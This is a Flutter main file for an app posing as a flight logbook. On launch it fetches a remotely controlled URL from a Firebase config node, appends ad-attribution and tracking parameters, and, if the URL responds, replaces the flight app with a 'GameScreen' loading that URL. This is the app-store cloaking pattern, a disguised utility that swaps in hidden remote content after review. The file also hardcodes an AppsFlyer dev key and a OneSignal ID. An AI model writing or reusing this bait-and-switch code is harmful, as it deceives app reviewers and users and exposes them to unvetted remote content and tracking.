import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flight_list/view/pages/home/Home_Screen.dart';
import 'package:flight_list/view/pages/spalsh/Splash_Screen.dart';
import 'package:flight_list/view/pages/add_flight/Add_Flight_Screen.dart';
import 'package:flight_list/view/pages/search/Search_Flight_Screen.dart';
import 'package:flight_list/view/pages/settings/Policy_Page_Settings.dart';
import 'package:flight_list/view/pages/settings/Settings_Screen.dart';
import 'package:flight_list/view/pages/stats/Stats_Flights_Screen.dart';
import 'package:flight_list/view/pages/settings/About_App_Screen.dart';

import 'data/data/fb.dart';
import 'view/widgets/flight_card.dart';

class DeepLink {
  DeepLink(this._clickEvent);
  final Map<String, dynamic> _clickEvent;

  Map<String, dynamic> get clickEvent => _clickEvent;

  String? get deepLinkValue => _clickEvent["deep_link_value"] as String?;
  String? get matchType => _clickEvent["match_type"] as String?;
  String? get clickHttpReferrer =>
      _clickEvent["click_http_referrer"] as String?;
  String? get mediaSource => _clickEvent["media_source"] as String?;
  String? get campaign => _clickEvent["campaign"] as String?;
  String? get campaignId => _clickEvent["campaign_id"] as String?;
  String? get af_sub1 => _clickEvent["af_sub1"] as String?;
  String? get af_sub2 => _clickEvent["af_sub2"] as String?;
  String? get af_sub3 => _clickEvent["af_sub3"] as String?;
  String? get af_sub4 => _clickEvent["af_sub4"] as String?;
  String? get af_sub5 => _clickEvent["af_sub5"] as String?;
  bool get isDeferred => _clickEvent["is_deferred"] as bool? ?? false;

  @override
  String toString() {
    return 'DeepLink: ${jsonEncode(_clickEvent)}';
  }

  String? getStringValue(String key) {
    return _clickEvent[key] as String?;
  }
}

class AppInitializationService {
  final AppsflyerSdk _appsflyer;
  DeepLink? _deepLinkResult;
  Map<String, dynamic> _conversionData = {};
  Map<String, dynamic> _asaData = {};

  AppInitializationService(this._appsflyer);

  Future<void> initialize() async {
    await _initializeFirebase();
    await _initializeAppsflyer();
    await _fetchAppleSearchAdsData();
  }

  Future<void> _initializeFirebase() async {
    try {
      await Firebase.initializeApp(
          options: DefaultFirebaseOptions.currentPlatform);
    } catch (e) {}
  }

  Future<void> _initializeAppsflyer() async {
    try {
      await _appsflyer.initSdk(
        registerConversionDataCallback: true,
        registerOnAppOpenAttributionCallback: true,
        registerOnDeepLinkingCallback: true,
      );

      _appsflyer.onDeepLinking((DeepLinkResult dp) {
        if (dp.status == Status.FOUND) {
          _deepLinkResult = DeepLink(dp.deepLink?.clickEvent ?? {});
        }
      });

      _appsflyer.onInstallConversionData((data) {
        _conversionData = data;
      });

      await Future.delayed(Duration(seconds: 5));
    } catch (e) {}
  }

  Future<void> _fetchAppleSearchAdsData() async {
    try {
      final String? appleSearchAdsToken =
          await FlutterAsaAttribution.instance.attributionToken();
      if (appleSearchAdsToken != null) {
        const url = 'https://api-adservices.apple.com/api/v1/';
        final headers = {'Content-Type': 'text/plain'};
        final response = await http.post(Uri.parse(url),
            headers: headers, body: appleSearchAdsToken);

        if (response.statusCode == 200) {
          _asaData = json.decode(response.body);
        }
      }
    } catch (e) {}
  }

  Map<String, String> buildUrlParams(String appsFlyerUID) {
    Map<String, String> params = {
      'appsflyer_id': _asaData['attribution'] == true ? 'asa' : appsFlyerUID,
      'app_id': "com.adfgg.udfsf",
      'dev_key': "Ek3U8C5zZspfEWU8bGn8sB",
      'apple_id': "id6737809433",
    };

    if (_asaData['attribution'] == true) {
      params.addAll({
        'utm_medium': _asaData['adId']?.toString() ?? '',
        'utm_content': _asaData['conversionType'] ?? '',
        'utm_term': _asaData['keywordId']?.toString() ?? '',
        'utm_source': _asaData['adGroupId']?.toString() ?? '',
        'utm_campaign': _asaData['campaignId']?.toString() ?? '',
      });
    } else if (_deepLinkResult != null) {
      params.addAll({
        'utm_medium': _deepLinkResult?.af_sub1 ?? '',
        'utm_content':
            _deepLinkResult?.af_sub2 ?? _deepLinkResult?.campaign ?? '',
        'utm_term': _deepLinkResult?.af_sub3 ?? '',
        'utm_source':
            _deepLinkResult?.af_sub4 ?? _deepLinkResult?.mediaSource ?? '',
        'utm_campaign':
            _deepLinkResult?.af_sub5 ?? _deepLinkResult?.campaignId ?? '',
        'deep_link_value': _deepLinkResult?.deepLinkValue ?? '',
      });
    } else if (_conversionData.isNotEmpty) {
      params.addAll({
        'utm_medium': _conversionData['af_sub1'] ?? '',
        'utm_content':
            _conversionData['af_sub2'] ?? _conversionData['campaign'] ?? '',
        'utm_term': _conversionData['af_sub3'] ?? '',
        'utm_source':
            _conversionData['af_sub4'] ?? _conversionData['media_source'] ?? '',
        'utm_campaign':
            _conversionData['af_sub5'] ?? _conversionData['af_adset'] ?? '',
      });
    } else {
      params.addAll({
        'utm_medium': 'organic',
        'utm_content': 'organic',
        'utm_term': 'organic',
        'utm_source': 'organic',
        'utm_campaign': 'organic',
      });
    }

    return params;
  }
}

Future<String> processConfig(Map<String, dynamic> config) async {
  final String baseUrl = config['answer'] as String;
  if (!baseUrl.startsWith('https://')) {
    return 'error';
  }

  final appsFlyerOptions = AppsFlyerOptions(
    afDevKey: 'Ek3U8C5zZspfEWU8bGn8sB',
    appId: '6737809433',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    showDebug: true,
  );
  final appsFlyerSdk = AppsflyerSdk(appsFlyerOptions);

  final appInitService = AppInitializationService(appsFlyerSdk);
  await appInitService.initialize();

  final appsFlyerUID = await appsFlyerSdk.getAppsFlyerUID();
  final params = appInitService.buildUrlParams(appsFlyerUID!);

  final String queryString =
      params.entries.map((e) => '${e.key}=${e.value}').join('&');
  final String finalUrl = '$baseUrl&$queryString';

  try {
    final response = await http.get(Uri.parse(finalUrl));
    if (response.statusCode == 200) {
      await _cacheFinalUrl(finalUrl);
      return finalUrl;
    }
  } catch (e) {}

  return 'error';
}

Future<void> _cacheFinalUrl(String finalUrl) async {
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.setString('gotex', finalUrl);
}

Future<String?> _getCachedFinalUrl() async {
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  return prefs.getString('gotex');
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: const Color(0xFFD13438),
        ),
      ),
      initialRoute: '/',
      routes: {
        '/': (context) => const InitializationScreen(),
        '/home': (context) => const HomeScreen(),
        '/add-flight': (context) => const AddFlightScreen(),
        '/search-flights': (context) => const SearchFlightsScreen(),
        '/privacy': (context) => const PrivacyReadScreen(),
        '/settings': (context) => const SettingsScreen(),
        '/stats': (context) => const StatsScreen(),
        '/about': (context) => const AboutScreen(),
      },
    );
  }
}

class InitializationScreen extends StatefulWidget {
  const InitializationScreen({Key? key}) : super(key: key);

  @override
  _InitializationScreenState createState() => _InitializationScreenState();
}

class _InitializationScreenState extends State<InitializationScreen> {
  late Future<String?> _initializationFuture;

  @override
  void initState() {
    super.initState();
    _initializationFuture = _initializeApp();
  }

  Future<String?> _initializeApp() async {
    var connectivityResult = await (Connectivity().checkConnectivity());
    if (connectivityResult == ConnectivityResult.none) {
      return null;
    }

    await AppTrackingTransparency.requestTrackingAuthorization();
    String cachedUrl = await _getCachedFinalUrl() ?? '';
    if (cachedUrl != '') {
      if (mounted) {
        return cachedUrl;
      }
    }

    await Firebase.initializeApp(
        options: DefaultFirebaseOptions.currentPlatform);
    DatabaseReference ref = FirebaseDatabase.instance.ref("config");
    DatabaseEvent event = await ref.once();
    Map<String, dynamic> config =
        Map<String, dynamic>.from(event.snapshot.value as Map);

    String finalUrl = await processConfig(config);
    if (finalUrl != 'error') {
      if (mounted) {
        await _cacheFinalUrl(finalUrl);
        return finalUrl;
      }
    }
    return null;
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<String?>(
      future: _initializationFuture,
      builder: (context, snapshot) {
        print(snapshot.data);
        if (snapshot.connectionState == ConnectionState.waiting) {
          return const SplashScreen();
        } else {
          if (snapshot.data != null) {
            return GameScreen(starter: snapshot.data!);
          } else {
            return const HomeScreen();
          }
        }
      },
    );
  }
}

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  OneSignal.initialize("5fe49068-c146-4821-9165-29cbed3381ed");
  OneSignal.Notifications.requestPermission(true);
  runApp(const MyApp());
}
